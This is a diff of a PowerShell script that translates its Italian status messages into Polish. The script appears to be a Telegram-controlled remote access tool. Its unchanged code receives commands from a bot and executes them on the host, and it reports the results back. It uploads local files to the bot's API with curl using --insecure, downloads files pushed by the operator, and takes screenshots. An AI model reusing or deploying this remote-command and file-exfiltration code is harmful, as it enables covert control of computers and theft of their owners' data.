@@ -16,8 +16,8 @@ function CheckAdminRights
 {
     $elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent())
     $elevated = $elevated.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if ($elevated) { return ("L'utente '$env:USERNAME' ha i privilegi di amministratore") } 
-    else { return ("L'utente '$env:USERNAME' non ha i privilegi di amministratore") }
+    if ($elevated) { return ("Użytkownik '$env:USERNAME' ma uprawnienia administratora") } 
+    else { return ("Użytkownik '$env:USERNAME' nie ma uprawnień administratora") }
 }
 
 function DownloadFile($file_id, $file_name)
@@ -25,18 +25,18 @@ function DownloadFile($file_id, $file_name)
     $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
     $file_path      = $get_file_path.result.file_path
     Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
-    if (Test-Path -Path $file_name) { SendMessage "File scaricato con successo" } 
-    else { SendMessage "Il file non è stato scaricato" }
+    if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" } 
+    else { SendMessage "Plik nie został pobrany" }
 }
 
 function SendFile($filePath) 
 {
-    SendMessage "Procedo ad inviare il file [$($filePath)]"
+    SendMessage "Przystępuję do wysłania pliku [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
         try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null } 
-        catch { SendMessage "Errore durante l'upload del file: [$($Error[0])]" }
+        catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" }
     } 
-    else { SendMessage "Il file indicato non è stato trovato" }
+    else { SendMessage "Wskazany plik nie został znaleziony" }
 }
 
 function SendScreenshot
@@ -127,13 +127,13 @@ function CommandListener
                 $text       = $sid[1..($sid.Length - 1)] -join " "
 
                 if ($user_id -notmatch $telegram_id) {
-                    $unauth_user_found = ('Utente [{0}] {1} non autorizzato ha inviato il seguente comando al bot: {2}' -f $user_id, $username, $text)
+                    $unauth_user_found = ('Użytkownik [{0}] {1} nieupoważniona osoba wysłała do bota następujące polecenie: {2}' -f $user_id, $username, $text)
                     SendMessage $unauth_user_found
                 }
 
-                if ($text -match "/online")          { SendMessage "Sessione operativa" $text }
+                if ($text -match "/online")          { SendMessage "Sesja aktywna" $text }
                 if ($sid[0] -notmatch $session_id)   { continue }
-                if ($text -match "exit")             { SendMessage "Sessione chiusa" $text; exit }
+                if ($text -match "exit")             { SendMessage "Sesja zabita" $text; exit }
 
                 if ($text.Length -gt 0) {
                     try {
@@ -153,7 +153,7 @@ function CommandListener
                         Start-Sleep -Milliseconds 100
                     }
 
-                    if ($output.Count -lt 1) { SendMessage ("Comando eseguito: " + $text) }
+                    if ($output.Count -lt 1) { SendMessage ("Polecenie wykonane: " + $text) }
                 }
                 if ($document) { $file_id = $document.file_id; $file_name = $document.file_name; DownloadFile $file_id $file_name }
             }
@@ -162,5 +162,4 @@ function CommandListener
     $session.Dispose()
 }
 
-# Avvia la funzione principale per ascoltare i comandi
 CommandListener
